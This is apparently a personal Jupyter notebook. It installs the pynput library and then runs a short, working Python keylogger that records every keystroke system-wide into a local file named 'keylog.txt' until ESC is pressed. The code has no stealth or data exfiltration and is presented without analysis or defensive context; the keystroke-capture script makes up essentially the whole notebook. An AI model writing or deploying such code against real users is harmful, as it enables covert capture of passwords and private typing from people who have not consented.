{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "171cf93d-c39b-4880-a251-e6c1e13439c1",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Collecting pynput\n",
      "  Downloading pynput-1.8.1-py2.py3-none-any.whl.metadata (32 kB)\n",
      "Requirement already satisfied: six in c:\\users\\nevid\\anaconda3\\lib\\site-packages (from pynput) (1.17.0)\n",
      "Downloading pynput-1.8.1-py2.py3-none-any.whl (91 kB)\n",
      "Installing collected packages: pynput\n",
      "Successfully installed pynput-1.8.1\n"
     ]
    }
   ],
   "source": [
    "!pip install pynput\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "id": "77c7a71a-f383-461c-a69a-4fcc19115029",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Keylogger started... (Press ESC to stop)\n"
     ]
    }
   ],
   "source": [
    "from pynput import keyboard\n",
    "log_file = \"keylog.txt\"\n",
    "key_map = {\n",
    "    keyboard.Key.space: \" \",\n",
    "    keyboard.Key.enter: \"\\n\",\n",
    "    keyboard.Key.tab: \"\\t\",\n",
    "    keyboard.Key.shift: \"\",\n",
    "    keyboard.Key.shift_r: \"\",\n",
    "    keyboard.Key.ctrl_l: \"\",\n",
    "    keyboard.Key.ctrl_r: \"\",\n",
    "    keyboard.Key.alt_l: \"\",\n",
    "    keyboard.Key.alt_r: \"\",\n",
    "    keyboard.Key.backspace: \" [BACKSPACE] \",\n",
    "    keyboard.Key.delete: \" [DEL] \",\n",
    "    keyboard.Key.esc: \" [ESC] \"\n",
    "}\n",
    "def on_press(key):\n",
    "    try:\n",
    "        with open(log_file, \"a\") as f:\n",
    "            f.write(key.char)\n",
    "    except AttributeError:\n",
    "        with open(log_file, \"a\") as f:\n",
    "            f.write(key_map.get(key, f\" [{key}] \"))\n",
    "def on_release(key):\n",
    "    if key == keyboard.Key.esc:\n",
    "        return False \n",
    "print(\"Keylogger started... (Press ESC to stop)\")\n",
    "with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:\n",
    "    listener.join()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "af2c5209-339f-444c-b3b9-2e2890c5638e",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python [conda env:base] *",
   "language": "python",
   "name": "conda-base-py"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.13.5"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
